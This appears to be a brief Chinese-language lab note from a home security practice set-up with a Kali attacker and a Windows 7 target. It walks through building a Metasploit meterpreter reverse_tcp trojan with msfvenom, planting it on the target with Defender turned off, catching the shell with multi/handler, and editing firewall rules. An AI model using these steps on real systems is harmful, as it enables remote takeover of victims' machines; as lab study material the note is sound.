# day2:使用MSF工具 正向连接

目标机为vulnsrack-win7 攻击机为kali

1. 在kali上创建一个木马

```msf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.76.141 LPORT=8888 -f exe -o payload.exe
```

2.  投放病毒

   将payload.exe移动至主计算机及win7（关闭windows defender）

   查看端口是否打开

   ```
   netstat -tnlup
   ```

3. 进入msf

   ```
   use exploit/multi/handler
   ```

   如果端口不对就 set LPORT 8888

4. 用win7打开payload.exe

   回到kali查看监听结果是否回显

5. 打开高级安全windows defender防火墙 入站规则 

   新建规则 并选择端口

   可在出站规则中找到8888no

